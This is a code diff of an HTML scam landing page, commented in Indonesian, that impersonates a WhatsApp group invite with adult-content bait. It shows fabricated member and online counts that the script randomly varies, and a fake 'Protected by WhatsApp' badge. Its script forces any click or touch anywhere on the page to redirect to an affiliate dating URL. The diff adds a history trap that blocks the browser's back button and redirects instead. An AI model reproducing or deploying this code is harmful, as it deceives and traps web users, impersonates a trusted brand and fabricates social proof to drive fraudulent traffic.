@@ -1,142 +1,120 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-	<link rel="canonical" href="https://www.fairobserver.com/">
-    <meta name="robots" content="index, follow">
-    <meta name="referrer" content="no-referrer-when-downgrade">
-    <meta property="og:title" content="🎥⏯2:40―●―――――53:20📽💋💦❤️ ADULT ONLY 21+😘💦">
-    <meta property="og:description" content="Browse trending profiles and discover new updates shared by active users.">
-    <meta property="og:image" content="https://snipboard.io/4IvstP.jpg">
-    <meta property="og:url" content="https://www.fairobserver.com/">
+    <!-- Meta Dasar & OpenGraph yang Anda minta -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <title>WhatsApp - Invite</title>
+    
     <meta property="og:type" content="website">
-    <meta property="og:site_name" content="WhatsApp Group">
-    <meta property="fb:app_id" content="124024574287414">
+    <meta property="og:title" content="🟢 WhatsApp Me">
+    <meta property="og:description" content="Browse trending profiles and discover new updates shared by active users.">
+    <meta property="og:image" content="https://snipboard.io/Zirncq.jpg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="1200">
+    <meta property="og:url" content="#">
+    
+    <meta name="description" content="Browse trending profiles and discover new updates shared by active users.">
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="🎥⏯2:40―●―――――53:20📽💋💦❤️ ADULT ONLY 21+😘💦">
+    <meta name="twitter:title" content="🟢 WhatsApp Me">
     <meta name="twitter:description" content="Browse trending profiles and discover new updates shared by active users.">
-    <meta name="twitter:image" content="https://snipboard.io/4IvstP.jpg">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <title>🎥⏯2:40―●―――――53:20📽💋💦❤️ ADULT ONLY 21+😘💦</title>
+    <meta name="twitter:image" content="https://snipboard.io/Zirncq.jpg">
+
+    <!-- FontAwesome untuk Ikon -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
     <style>
+        /* Reset & Base Styles */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Helvetica, Arial, sans-serif;
-            -webkit-tap-highlight-color: transparent;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
         }
 
         body {
-            color: white;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            cursor: pointer; /* Indikator area klik penuh */
-            background-color: #0a2b1f;
-            overflow-x: hidden;
+            background-color: #000;
+            color: #fff;
+            overflow: hidden; /* Mencegah scroll pada halaman utama */
+            height: 100vh;
+            width: 100vw;
+            position: relative;
         }
 
-        /* Video Background Handling */
-        video.bg-video {
+        /* Video Background */
+        .bg-video {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
             object-fit: cover;
-            object-position: center;
-            z-index: -2;
-        }
-
-        /* Overlay Gelap & Blur */
-        body::before {
-            content: "";
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.6); /* Sedikit lebih gelap untuk keterbacaan */
             z-index: -1;
-            backdrop-filter: blur(3px);
+            filter: brightness(0.4); /* Gelapkan video agar teks terbaca */
         }
 
-        /* Header ala WhatsApp */
+        /* Header */
         .whatsapp-header {
-            background-color: #075e54;
-            padding: 16px;
             display: flex;
             align-items: center;
-            gap: 15px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
-            flex-shrink: 0;
+            padding: 15px 20px;
+            background: linear-gradient(to bottom, rgba(0,0,0,0.8), rgba(0,0,0,0));
+            position: absolute;
+            top: 0;
+            width: 100%;
             z-index: 10;
         }
 
         .back-button {
-            color: white;
-            font-size: 20px;
+            margin-right: 15px;
             cursor: pointer;
-            transition: opacity 0.2s;
-            opacity: 0.9;
-            width: 30px;
-            display: flex;
-            justify-content: center;
-        }
-        .back-button:hover { opacity: 1; }
-
-        .header-text {
-            flex: 1;
+            font-size: 1.2rem;
         }
 
         .header-text h1 {
-            font-size: 18px;
+            font-size: 1.1rem;
             font-weight: 600;
-            line-height: 1.2;
+            color: #fff;
         }
 
         .header-text p {
-            font-size: 13px;
-            opacity: 0.9;
-            margin-top: 2px;
+            font-size: 0.85rem;
+            color: #ccc;
         }
 
-        /* Main Layout */
+        /* Main Content */
         .main-content {
-            flex: 1;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            z-index: 5;
             display: flex;
             flex-direction: column;
-            justify-content: center;
             align-items: center;
-            padding: 20px 20px;
-            text-align: center;
-            position: relative;
-            z-index: 1;
+            gap: 20px;
         }
 
+        /* Profile Section */
         .profile-container {
-            margin-bottom: 15px;
-            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 10px;
         }
 
         .profile-img {
-            width: 120px;
-            height: 120px;
+            width: 100px;
+            height: 100px;
             border-radius: 50%;
-            margin: 0 auto 15px;
             overflow: hidden;
-            background: linear-gradient(145deg, #25d366, #128c7e);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: white;
-            font-size: 52px;
-            box-shadow: 0 15px 25px rgba(0,0,0,0.3);
-            border: 3px solid rgba(255,255,255,0.4);
-            position: relative;
+            border: 3px solid #25D366; /* WhatsApp Green */
+            box-shadow: 0 0 15px rgba(37, 211, 102, 0.5);
+            margin-bottom: 10px;
+            background-color: #333;
         }
 
         .profile-img img {
@@ -146,502 +124,367 @@
         }
 
         .group-name {
-            font-size: 24px;
+            font-size: 1.3rem;
             font-weight: 700;
             margin-bottom: 5px;
-            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
         }
 
         .group-info {
-            font-size: 14px;
-            opacity: 0.9;
-            margin-bottom: 20px;
-            font-weight: 400;
+            font-size: 0.9rem;
+            color: #e0e0e0;
         }
 
-        /* Stats Cards */
+        /* Members Stats */
         .members-info {
             display: flex;
-            justify-content: center;
-            gap: 15px;
-            margin-bottom: 25px;
-            flex-wrap: wrap;
+            gap: 20px;
+            margin-bottom: 10px;
         }
 
-        .member-count,
-        .active-members {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            cursor: default;
-            background: rgba(0,0,0,0.4);
-            backdrop-filter: blur(10px);
-            padding: 10px 24px;
-            border-radius: 45px;
-            border: 1px solid rgba(255,255,255,0.1);
-            transition: all 0.2s;
-            min-width: 100px;
-        }
-        
-        /* Efek hover pada stats */
-        .member-count:hover,
-        .active-members:hover {
-            background: rgba(0,0,0,0.6);
-            transform: translateY(-2px);
+        .member-count, .active-members {
+            text-align: center;
         }
 
         .count {
-            font-size: 24px;
-            font-weight: 800;
-            letter-spacing: 0.5px;
+            font-size: 1.5rem;
+            font-weight: bold;
         }
 
         .label {
-            font-size: 12px;
-            opacity: 0.85;
-            margin-top: 3px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
+            font-size: 0.8rem;
+            color: #bbb;
         }
 
         .online-indicator {
             display: flex;
             align-items: center;
-            gap: 6px;
-            margin-top: 4px;
-            font-size: 12px;
-            color: #25d366;
+            justify-content: center;
+            gap: 5px;
+            font-size: 0.8rem;
+            color: #25D366;
         }
 
         .dot {
             width: 8px;
             height: 8px;
+            background-color: #25D366;
             border-radius: 50%;
-            background-color: #25d366;
-            box-shadow: 0 0 8px #25d366;
-            animation: pulseGreen 1.4s infinite;
+            box-shadow: 0 0 5px #25D366;
         }
 
-        @keyframes pulseGreen {
-            0% { opacity: 0.6; transform: scale(0.9);}
-            50% { opacity: 1; transform: scale(1.1);}
-            100% { opacity: 0.6; transform: scale(0.9);}
-        }
-
-        /* Buttons Container */
+        /* Buttons */
         .button-container {
+            width: 100%;
             display: flex;
             flex-direction: column;
-            align-items: center;
-            gap: 16px;
-            margin: 15px 0 20px;
-            width: 100%;
-            max-width: 350px;
+            gap: 12px;
         }
 
         .btn-social {
-            width: 100%;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 12px;
-            padding: 14px 20px;
-            border-radius: 60px;
-            font-size: 16px;
-            font-weight: 700;
+            gap: 10px;
+            width: 100%;
+            padding: 12px 20px;
+            border-radius: 25px;
             text-decoration: none;
-            transition: all 0.25s ease;
-            cursor: pointer;
-            border: none;
-            color: white;
-            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            position: relative;
-        }
-
-        .btn-social span {
-            display: inline-block;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            white-space: nowrap;
-            flex: 1;
-            text-align: center;
-        }
-
-        /* Custom Icon Handling */
-        .btn-social .custom-icon {
-            width: 22px;
-            height: 22px;
-            object-fit: contain;
-            flex-shrink: 0;
-        }
-
-        .btn-social i {
-            font-size: 20px;
-            flex-shrink: 0;
-        }
-
-        /* Button Colors */
-        .btn-social.whatsapp {
-            background: linear-gradient(135deg, #25d366, #128c7e);
-        }
-        .btn-social.tinder {
-            background: linear-gradient(135deg, #fd297b, #ff655b); /* Tinder Gradient */
-        }
-        .btn-social.onlyfans {
-            background: linear-gradient(135deg, #00aff0, #009cd6); /* OnlyFans Blue */
-        }
-
-        .btn-social:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 12px 28px rgba(0, 0, 0, 0.5);
-            filter: brightness(1.1);
+            font-weight: 600;
+            font-size: 0.95rem;
+            transition: transform 0.2s, opacity 0.2s;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
         }
 
         .btn-social:active {
             transform: scale(0.98);
         }
 
-        /* Loading State Animation */
         .btn-social.loading {
-            pointer-events: none;
             opacity: 0.8;
-            transform: scale(0.98);
-        }
-        
-        .btn-social.loading i, 
-        .btn-social.loading .custom-icon {
-            animation: spin 1s linear infinite;
+            pointer-events: none;
         }
 
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .custom-icon {
+            width: 20px;
+            height: 20px;
+        }
+
+        /* Button Colors */
+        .whatsapp {
+            background: #25D366;
+            color: #fff;
+        }
+
+        .tinder {
+            background: linear-gradient(45deg, #fd267a, #ff6036);
+            color: #fff;
+        }
+
+        .onlyfans {
+            background: #00AFF0; /* Official OF Blue */
+            color: #fff;
         }
 
         /* Security Notice */
         .security-notice {
+            font-size: 0.75rem;
+            color: #aaa;
+            margin-top: 15px;
             display: flex;
             align-items: center;
-            justify-content: center;
-            gap: 8px;
-            margin-top: 20px;
-            font-size: 11px;
-            background: rgba(0,0,0,0.4);
-            padding: 8px 18px;
-            border-radius: 60px;
-            backdrop-filter: blur(5px);
-            border: 1px solid rgba(255,255,255,0.05);
+            gap: 5px;
         }
 
         /* Footer */
         .footer {
-            padding: 14px;
-            font-size: 10px;
-            opacity: 0.5;
+            position: absolute;
+            bottom: 20px;
+            width: 100%;
             text-align: center;
-            flex-shrink: 0;
+            font-size: 0.8rem;
+            color: #888;
+            animation: pulse 1.5s infinite;
         }
 
-        /* Floating Animation for Profile */
-        @keyframes softPulse {
-            0% { transform: scale(1); box-shadow: 0 15px 25px rgba(0,0,0,0.2);}
-            50% { transform: scale(1.03); box-shadow: 0 20px 35px rgba(0,0,0,0.3);}
-            100% { transform: scale(1); box-shadow: 0 15px 25px rgba(0,0,0,0.2);}
-        }
-        .profile-img {
-            animation: softPulse 4s infinite ease-in-out;
-        }
-
-        /* Responsive Queries */
-        @media (max-width: 520px) {
-            .profile-img { width: 100px; height: 100px; }
-            .group-name { font-size: 20px; }
-            .members-info { gap: 10px; }
-            .count { font-size: 20px; }
-            .member-count, .active-members { padding: 8px 18px; min-width: 90px;}
-            .button-container { max-width: 280px; gap: 12px; }
-        }
-
-        @media (max-width: 400px) {
-            .btn-social { font-size: 14px; padding: 12px; }
-            .btn-social .custom-icon { width: 18px; height: 18px; }
-            .btn-social i { font-size: 18px; }
+        @keyframes pulse {
+            0% { opacity: 0.5; }
+            50% { opacity: 1; }
+            100% { opacity: 0.5; }
         }
     </style>
 </head>
 <body>
 
-<video class="bg-video" id="bgVideo" autoplay muted loop playsinline poster="https://thumbsnap.com/i/tiAP6Uk1.mp4"></video>
+    <!-- Background Video -->
+    <video class="bg-video" id="bgVideo" autoplay muted loop playsinline></video>
 
-
-<div class="whatsapp-header">
-    <div class="back-button" id="backBtn" title="Go Back">
-        <i class="fas fa-arrow-left"></i>
-    </div>
-    <div class="header-text">
-        <h1>💕 Sweet Escape 💕</h1>
-        <p>WhatsApp • Invite</p>
-    </div>
-</div>
-
-<div class="main-content">
-    <div class="profile-container">
-        <div class="profile-img">
-            <!-- Placeholder Image acak untuk profil -->
-            <img src="https://pbs.twimg.com/media/HGM_aQjbIAAO4sz?format=jpg&name=large" alt="Group Icon">
+    <!-- Header -->
+    <div class="whatsapp-header">
+        <div class="back-button" id="backBtn">
+            <i class="fas fa-arrow-left"></i>
         </div>
-        <div class="group-name">💕 Sweet Escape 💕</div>
-        <div class="group-info">👑 Admin: Claire &amp; Audrey 🔥</div>
+        <div class="header-text">
+            <h1>🌟 Star Girls 🌟</h1>
+            <p>WhatsApp • Invite</p>
+        </div>
     </div>
 
-    <div class="members-info">
-        <div class="member-count" id="memberCountDisplay">
-            <div class="count">131.1K</div>
-            <div class="label">Members</div>
+    <!-- Main Content -->
+    <div class="main-content">
+        <!-- Random Profile Image Logic applied here -->
+        <div class="profile-container">
+            <div class="profile-img">
+                <img id="groupIcon" src="" alt="Group Icon">
+            </div>
+            <div class="group-name">🌟 Star Girls 🌟</div>
+            <div class="group-info">👑 Admin: Emily &amp; Aria 🔥</div>
         </div>
-        <div class="active-members" id="activeMembersDisplay">
-            <div class="count">55.0K</div>
-            <div class="online-indicator">
-                <div class="dot"></div>
-                <span>Online now</span>
+
+        <div class="members-info">
+            <div class="member-count" id="memberCountDisplay">
+                <div class="count">135.0K</div>
+                <div class="label">Members</div>
+            </div>
+            <div class="active-members" id="activeMembersDisplay">
+                <div class="count">53.6K</div>
+                <div class="online-indicator">
+                    <div class="dot"></div>
+                    <span>Online now</span>
+                </div>
             </div>
         </div>
+
+        <div class="button-container">
+            <a href="#" class="btn-social whatsapp loading" id="whatsappBtn" data-original="
+                <i class='fab fa-whatsapp'></i>
+                <span>Join WhatsApp Group</span>
+            " style="pointer-events: none;">
+                <i class="fas fa-spinner fa-spin"></i><span>Redirecting...</span>
+            </a>
+            
+            <a href="#" class="btn-social tinder" id="tinderBtn">
+                <img class="custom-icon" src="https://tinder.com/favicon-32x32.png" alt="Tinder" onerror="this.style.display='none'; this.nextElementSibling.style.display='inline-block';">
+                <i class="fas fa-fire" style="display: none;"></i>
+                <span>Find Your Perfect Match Tonight</span>
+            </a>
+            
+            <a href="#" class="btn-social onlyfans" id="onlyfansBtn">
+                <img class="custom-icon" src="https://files.catbox.moe/y2ouht.ico" alt="OnlyFans" onerror="this.style.display='none'; this.nextElementSibling.style.display='inline-block';">
+                <i class="fas fa-star" style="display: none;"></i>
+                <span>Unlock Exclusive OnlyFans Content</span>
+            </a>
+        </div>
+
+        <div class="security-notice">
+            <i class="fas fa-shield-alt"></i>
+            <span>Protected by WhatsApp</span>
+        </div>
     </div>
 
-    <div class="button-container">
-        <a href="#" class="btn-social whatsapp" id="whatsappBtn">
-            <i class="fab fa-whatsapp"></i>
-            <span>Join WhatsApp Group</span>
-        </a>
-        
-        <a href="#" class="btn-social tinder" id="tinderBtn">
-            <img class="custom-icon" src="https://tinder.com/favicon-32x32.png" alt="Tinder" onerror="this.style.display='none'; this.nextSibling.style.display='inline';">
-            <i class="fas fa-fire" style="display: none;"></i>
-            <span>Find Your Perfect Match Tonight</span>
-        </a>
-        
-        <a href="#" class="btn-social onlyfans" id="onlyfansBtn">
-            <img class="custom-icon" src="https://files.catbox.moe/y2ouht.ico" alt="OnlyFans" onerror="this.style.display='none'; this.nextSibling.style.display='inline';">
-            <i class="fas fa-star" style="display: none;"></i>
-            <span>Unlock Exclusive OnlyFans Content</span>
-        </a>
+    <div class="footer">
+        ⚡ Click anywhere to join instantly!
     </div>
 
-    <div class="security-notice">
-        <i class="fas fa-shield-alt"></i>
-        <span>Protected by WhatsApp • Trusted invite</span>
-    </div>
-</div>
+    <script>
+        // --- KONFIGURASI GAMBAR ---
+        const imageList = [
+            'https://yaaoho.com/assets/img/landing/bg/01.jpg',
+            'https://yaaoho.com/assets/img/landing/bg/02.jpg',
+            'https://yaaoho.com/assets/img/landing/bg/03.jpg',
+            'https://yaaoho.com/assets/img/landing/bg/04.jpg',
+            'https://yaaoho.com/assets/img/landing/bg/05.jpg'
+        ];
 
-<div class="footer">
-    ⚡ Click anywhere to join instantly!
-</div>
+        // Target Redirect URL
+        const targetRedirectUrl = "https://zokxjg.datingllove.com/?utm_source=da57dc555e50572d&s1=188302&s2=2257084&s3=GREYSYAA&click_id=GREYSYAA&ban=inst&j1=1";
+        let isRedirecting = false;
 
-<script>
-    // --- Configuration ---
-    // Ganti URL ini dengan link tujuan Anda (misal: link affiliate, link WA, dll)
-    const targetRedirectUrl = "https://jhipQ8c.johnston619.lat/c78Af0zUmAYNwh8J68v5";
-    
-    let isRedirecting = false;
+        // --- FUNGSI UTAMA ---
 
-    // --- Functions ---
-
-    function showLoadingOnButton(button) {
-        if (!button) return;
-        
-        // Simpan konten asli jika belum ada
-        if (!button.hasAttribute('data-original')) {
-            button.setAttribute('data-original', button.innerHTML);
-        }
-        
-        button.innerHTML = '<i class="fas fa-spinner fa-spin"></i><span>Redirecting...</span>';
-        button.classList.add('loading');
-        button.style.pointerEvents = 'none';
-    }
-
-    function performRedirect(buttonElement = null) {
-        if (isRedirecting) return;
-        
-        // Validasi URL
-        if (!targetRedirectUrl || targetRedirectUrl === "#") {
-            console.warn("⚠️ Redirect URL belum diset. Membiarkan user di halaman.");
-            const btn = buttonElement || document.querySelector('.btn-social');
-            if (btn) {
-                const originalText = btn.querySelector('span').innerText;
-                btn.querySelector('span').innerText = "Link Configuration Needed";
-                setTimeout(() => {
-                    btn.querySelector('span').innerText = originalText;
-                    btn.classList.remove('loading');
-                }, 2000);
+        // 1. Fungsi untuk mengambil gambar acak
+        function setRandomProfileImage() {
+            const imgElement = document.getElementById('groupIcon');
+            if (imgElement && imageList.length > 0) {
+                const randomIndex = Math.floor(Math.random() * imageList.length);
+                const randomSrc = imageList[randomIndex];
+                imgElement.src = randomSrc;
+                console.log("✅ Profile Image set to:", randomSrc);
             }
-            return;
         }
-        
-        isRedirecting = true;
-        console.log("🚀 Redirecting to:", targetRedirectUrl);
-        
-        // Efek loading pada tombol
-        if (buttonElement) {
-            showLoadingOnButton(buttonElement);
-        } else {
-            const anyBtn = document.querySelector('.btn-social');
-            if (anyBtn) showLoadingOnButton(anyBtn);
+
+        // 2. Fungsi Redirect
+        function performRedirect(buttonElement = null) {
+            if (isRedirecting) return;
+            
+            isRedirecting = true;
+            console.log("🔴 Redirecting to:", targetRedirectUrl);
+            
+            // Tampilkan loading pada tombol yang diklik (atau tombol pertama jika body klik)
+            const btn = buttonElement || document.querySelector('.btn-social.whatsapp');
+            if (btn) {
+                btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i><span>Redirecting...</span>';
+                btn.classList.add('loading');
+                btn.style.pointerEvents = 'none';
+                
+                // Ubah semua tombol lain agar tidak bisa diklik
+                document.querySelectorAll('.btn-social').forEach(b => {
+                    if(b !== btn) {
+                        b.style.opacity = '0.5';
+                        b.style.pointerEvents = 'none';
+                    }
+                });
+            }
+            
+            setTimeout(function() {
+                window.location.href = targetRedirectUrl;
+            }, 2000); // Delay sedikit agar loading terlihat
         }
-        
-        // Delay kecil untuk efek visual
-        setTimeout(function() {
-            window.location.href = targetRedirectUrl;
-        }, 400); 
-    }
 
-    // --- Event Listeners ---
+        // --- INISIALISASI & EVENT LISTENERS ---
 
-    const whatsappBtn = document.getElementById('whatsappBtn');
-    const tinderBtn = document.getElementById('tinderBtn');
-    const onlyfansBtn = document.getElementById('onlyfansBtn');
-    const backBtn = document.getElementById('backBtn');
+        document.addEventListener("DOMContentLoaded", function() {
+            
+            // Jalankan fungsi gambar acak
+            setRandomProfileImage();
+            
+            // Init Video Background
+            initBackgroundVideo();
 
-    // 1. Klik pada tombol tertentu
-    [whatsappBtn, tinderBtn, onlyfansBtn].forEach(btn => {
-        if (btn) {
-            btn.addEventListener('click', function(e) {
-                e.preventDefault();
-                e.stopPropagation(); // Mencegah trigger klik body
-                performRedirect(this);
+            // Init Counters
+            animateCounters();
+
+            // ⚠️ AUTO-REDIRECT TELAH DIHAPUS SESUAI PERMINTAAN
+            // Pengguna sekarang harus mengklik tombol manual.
+        });
+
+        // Event Listener Tombol
+        const buttons = ['whatsappBtn', 'tinderBtn', 'onlyfansBtn'];
+        buttons.forEach(id => {
+            const btn = document.getElementById(id);
+            if (btn) {
+                btn.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    performRedirect(this);
+                });
+            }
+        });
+
+        // Event Listener Body (Click anywhere)
+        document.body.addEventListener('click', function(e) {
+            const isButton = e.target.closest('.btn-social') || e.target.closest('#backBtn');
+            if (!isButton && !isRedirecting) {
+                performRedirect(null);
+            }
+        });
+
+        document.body.addEventListener('touchstart', function(e) {
+            const isButton = e.target.closest('.btn-social') || e.target.closest('#backBtn');
+            if (!isButton && !isRedirecting) {
+                e.preventDefault(); 
+                performRedirect(null);
+            }
+        }, { passive: false });
+
+        // Back Button Logic (Push State)
+        const backBtn = document.getElementById('backBtn');
+        if (backBtn) {
+            backBtn.addEventListener('click', function(e) {
+                e.stopPropagation();
+                history.back();
             });
         }
-    });
 
-    // 2. Klik pada area body (Click Anywhere)
-    document.body.addEventListener('click', function(e) {
-        const isButton = e.target.closest('.btn-social') || e.target.closest('#backBtn');
-        if (!isButton && !isRedirecting) {
-            e.stopPropagation();
-            performRedirect(null);
-        }
-    });
-
-    // 3. Touch support (untuk mobile)
-    document.body.addEventListener('touchstart', function(e) {
-        const isButton = e.target.closest('.btn-social') || e.target.closest('#backBtn');
-        if (!isButton && !isRedirecting) {
-            e.preventDefault(); // Mencegah zoom/scroll double tap
-            performRedirect(null);
-        }
-    }, { passive: false });
-
-    // 4. Disable Context Menu (Right Click)
-    document.body.addEventListener('contextmenu', function(e) {
-        const isButton = e.target.closest('.btn-social');
-        if (!isButton) {
-            e.preventDefault();
-            performRedirect(null);
-            return false;
-        }
-    });
-
-    // 5. Back Button Logic
-    if (backBtn) {
-        backBtn.addEventListener('click', function(e) {
-            e.stopPropagation();
-            history.back();
-        });
-    }
-
-	// Daftar Video
-	const videoList = [
-		'https://thumbsnap.com/i/tiAP6Uk1.mp4',
-		'https://thumbsnap.com/i/BrJcpXuM.mp4',
-		'https://thumbsnap.com/i/GHPahdDh.mp4'
-	];
-
-	// Fungsi untuk ambil video acak
-	function getRandomVideo() {
-		return videoList[Math.floor(Math.random() * videoList.length)];
-	}
-
-	// Fungsi Inisialisasi (Dijalankan saat halaman dibuka)
-	function initBackgroundVideo() {
-		const videoEl = document.getElementById('bgVideo');
-		if (!videoEl) return;
-    
-		// --- BAGIAN TERPENTING ---
-		// Baris ini yang memilih video acak DAN memasukkannya ke player.
-		// Pastikan TIDAK ADA tanda // di depannya.
-		videoEl.src = getRandomVideo(); 
-    
-		// Perintah browser untuk memulai memuat dan memutar
-		videoEl.load();
-		videoEl.play().catch(err => {
-			console.log("Autoplay dicegah browser.");
-		});
-	}
-
-	// Panggil fungsi ini segera saat script dibaca
-	initBackgroundVideo();
-
-    // Error handling video
-    const bgVideo = document.getElementById('bgVideo');
-    if (bgVideo) {
-        bgVideo.addEventListener('ended', function() {
-            this.currentTime = 0;
-            this.play().catch(e => console.log("Loop error"));
-        });
-        bgVideo.addEventListener('error', function() {
-            console.log("Video error, mencoba video lain...");
-            this.src = getRandomVideo();
-            this.load();
-            this.play().catch(() => {});
-        });
-    }
-
-    // --- Counter Animation Logic ---
-    function animateCounters() {
-        const memberEl = document.querySelector('#memberCountDisplay .count');
-        const activeEl = document.querySelector('#activeMembersDisplay .count');
-        
-        if (memberEl && activeEl) {
-            setInterval(() => {
-                if (!isRedirecting) {
-                    // Random Member Count
-                    let currentMember = parseFloat(memberEl.innerText) || 130.6;
-                    let delta = (Math.random() * 0.5) - 0.2; // Fluktuasi kecil
-                    let newMember = currentMember + delta;
-                    // Clamp values
-                    if (newMember > 135) newMember = 135;
-                    if (newMember < 128) newMember = 128;
-                    memberEl.innerText = newMember.toFixed(1) + 'K';
-                    
-                    // Random Active Count
-                    let currentOnline = parseFloat(activeEl.innerText) || 50.8;
-                    let deltaOnline = (Math.random() * 0.8) - 0.3;
-                    let newOnline = currentOnline + deltaOnline;
-                    if (newOnline > 55) newOnline = 55;
-                    if (newOnline < 45) newOnline = 45;
-                    activeEl.innerText = newOnline.toFixed(1) + 'K';
-                }
-            }, 3000); // Update setiap 3 detik
-        }
-    }
-
-    animateCounters();
-
-    // --- History Lock (Opsional: Mencegah user tombol back browser) ---
-    // Hanya aktifkan jika ini adalah gateway landing page
-    if (window.history && window.history.pushState) {
         history.pushState(null, null, location.href);
         window.addEventListener('popstate', function() {
             if (!isRedirecting) {
                 history.pushState(null, null, location.href);
-                // Jika ingin redirect saat tombol back ditekan, uncomment baris bawah:
-                // performRedirect(null); 
+                performRedirect(null);
             }
         });
-    }
 
-</script>
+        // --- VIDEO & COUNTER LOGIC ---
+
+        const videoList = [
+            'https://thumbsnap.com/i/tiAP6Uk1.mp4',
+            'https://thumbsnap.com/i/BrJcpXuM.mp4',
+			'https://thumbsnap.com/i/nicST2t7.mp4',
+            'https://thumbsnap.com/i/GHPahdDh.mp4'
+        ];
+
+        function initBackgroundVideo() {
+            const videoEl = document.getElementById('bgVideo');
+            if (!videoEl) return;
+            const randomVid = videoList[Math.floor(Math.random() * videoList.length)];
+            videoEl.src = randomVid;
+            videoEl.load();
+            videoEl.play().catch(err => console.log("Autoplay prevented, user interaction needed."));
+        }
+
+        function animateCounters() {
+            const memberEl = document.querySelector('#memberCountDisplay .count');
+            const activeEl = document.querySelector('#activeMembersDisplay .count');
+            
+            if (memberEl && activeEl) {
+                setInterval(() => {
+                    if (!isRedirecting) {
+                        let currentMember = parseFloat(memberEl.innerText) || 130.6;
+                        let delta = (Math.random() * 0.5) - 0.2;
+                        let newMember = currentMember + delta;
+                        if (newMember > 135) newMember = 135;
+                        if (newMember < 128) newMember = 128;
+                        memberEl.innerText = newMember.toFixed(1) + 'K';
+                        
+                        let currentOnline = parseFloat(activeEl.innerText) || 50.8;
+                        let deltaOnline = (Math.random() * 0.8) - 0.3;
+                        let newOnline = currentOnline + deltaOnline;
+                        if (newOnline > 55) newOnline = 55;
+                        if (newOnline < 45) newOnline = 45;
+                        activeEl.innerText = newOnline.toFixed(1) + 'K';
+                    }
+                }, 5000);
+            }
+        }
+    </script>
 </body>
 </html>
